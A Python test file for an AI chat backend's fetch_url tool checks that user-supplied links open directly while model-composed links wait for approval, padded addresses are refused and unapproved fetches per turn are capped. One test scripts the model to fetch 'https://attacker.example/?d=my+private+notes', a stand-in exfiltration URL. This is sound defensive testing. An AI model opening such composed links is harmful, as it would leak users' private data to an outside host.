"""/api/chat: fetch_url opens known links directly, asks for composed ones (tilt_ui-eevz.10)."""
import json

import pytest
from pydantic_ai.messages import ModelRequest, ModelResponse, TextPart, ToolCallPart, ToolReturnPart
from pydantic_ai.models.function import DeltaToolCall, FunctionModel

from backend.services import web_fetch
from backend.tests.test_chat_api import _events, _send, _user_msg, chat_env  # noqa: F401 (fixture)


def _model(url):
    def script(messages):
        last = messages[-1]
        returns = [p for p in last.parts if isinstance(p, ToolReturnPart)] if isinstance(last, ModelRequest) else []
        return json.dumps(returns[0].content, default=str) if returns else ("fetch_url", {"url": url}, "call_fetch")

    async def stream(messages, info):
        out = script(messages)
        if isinstance(out, str):
            yield out
        else:
            yield {0: DeltaToolCall(name=out[0], json_args=json.dumps(out[1]), tool_call_id=out[2])}

    def fn(messages, info):
        out = script(messages)
        if isinstance(out, str):
            return ModelResponse(parts=[TextPart(out)])
        return ModelResponse(parts=[ToolCallPart(out[0], out[1], tool_call_id=out[2])])

    return FunctionModel(fn, stream_function=stream)


@pytest.fixture
def fake_fetch(monkeypatch):
    calls = []

    async def fetch_page(url, offset=0):
        calls.append(url)
        return {"url": url, "content": "PAGE TEXT"}

    monkeypatch.setattr(web_fetch, "fetch_page", fetch_page)
    return calls


@pytest.mark.asyncio
async def test_link_from_the_user_opens_without_asking(client, test_db, chat_env, fake_fetch):  # noqa: F811
    chat_env["model"] = _model("https://byo.com/recipes/pliny-clone")
    r = await _send(client, "l1", _user_msg("Clone this one: https://byo.com/recipes/pliny-clone"))
    assert "tool-approval-request" not in [e["type"] for e in _events(r)]
    assert fake_fetch == ["https://byo.com/recipes/pliny-clone"]


@pytest.mark.asyncio
async def test_composed_link_waits_for_approval(client, test_db, chat_env, fake_fetch):  # noqa: F811
    leak = "https://attacker.example/?d=my+private+notes"
    chat_env["model"] = _model(leak)
    r = await _send(client, "l2", _user_msg("Clone Pliny the Elder"))
    assert "tool-approval-request" in [e["type"] for e in _events(r)]
    assert fake_fetch == []  # nothing left the building

    approve = {"id": "a1", "role": "assistant", "parts": [{
        "type": "tool-fetch_url", "toolCallId": "call_fetch", "state": "approval-responded",
        "input": {"url": leak}, "approval": {"id": "call_fetch", "approved": False, "reason": "No"},
    }]}
    r = await _send(client, "l2", approve)
    assert r.status_code == 200
    assert fake_fetch == []  # denied: still not opened



@pytest.mark.asyncio
async def test_padded_or_spaced_addresses_are_refused(client, test_db, chat_env, fake_fetch):  # noqa: F811
    chat_env["model"] = _model("\u00a0" * 50 + "https://byo.com/recipes/pliny-clone")
    r = await _send(client, "l3", _user_msg("Clone this one: https://byo.com/recipes/pliny-clone"))
    assert "tool-approval-request" not in [e["type"] for e in _events(r)]
    assert fake_fetch == [] and "spaces or control characters" in r.text


@pytest.mark.asyncio
async def test_more_than_five_unapproved_opens_per_turn_ask(client, test_db, chat_env, fake_fetch):  # noqa: F811
    url = "https://byo.com/recipes/pliny-clone"
    n = {"calls": 0}

    def fn(messages, info):
        if n["calls"] < 7:
            n["calls"] += 1
            return ModelResponse(parts=[ToolCallPart("fetch_url", {"url": url}, tool_call_id=f"c{n['calls']}")])
        return ModelResponse(parts=[TextPart("done")])

    async def stream(messages, info):
        if n["calls"] < 7:
            n["calls"] += 1
            yield {0: DeltaToolCall(name="fetch_url", json_args=json.dumps({"url": url}), tool_call_id=f"c{n['calls']}")}
        else:
            yield "done"

    chat_env["model"] = FunctionModel(fn, stream_function=stream)
    r = await _send(client, "l4", _user_msg(f"Read {url}"))
    assert len(fake_fetch) == 5
    assert "tool-approval-request" in [e["type"] for e in _events(r)]

    # Declining starts a new request; the budget must not reset (codex)
    deny = {"id": "a2", "role": "assistant", "parts": [{
        "type": "tool-fetch_url", "toolCallId": "c6", "state": "approval-responded",
        "input": {"url": url}, "approval": {"id": "c6", "approved": False, "reason": "No"},
    }]}
    r = await _send(client, "l4", deny)
    assert r.status_code == 200
    assert len(fake_fetch) == 5
    assert "tool-approval-request" in [e["type"] for e in _events(r)]  # the 7th open asks too



@pytest.mark.asyncio
async def test_a_batch_of_opens_in_one_response_is_capped(client, test_db, chat_env, fake_fetch):  # noqa: F811
    """codex: parallel calls in one response all saw the same history count."""
    url = "https://byo.com/recipes/pliny-clone"
    done = {"v": False}

    def calls():
        return [ToolCallPart("fetch_url", {"url": url}, tool_call_id=f"b{i}") for i in range(7)]

    def fn(messages, info):
        if not done["v"]:
            done["v"] = True
            return ModelResponse(parts=calls())
        return ModelResponse(parts=[TextPart("done")])

    async def stream(messages, info):
        if not done["v"]:
            done["v"] = True
            yield {i: DeltaToolCall(name="fetch_url", json_args=json.dumps({"url": url}), tool_call_id=f"b{i}") for i in range(7)}
        else:
            yield "done"

    chat_env["model"] = FunctionModel(fn, stream_function=stream)
    r = await _send(client, "l5", _user_msg(f"Read {url}"))
    assert len(fake_fetch) == 5
    assert "tool-approval-request" in [e["type"] for e in _events(r)]
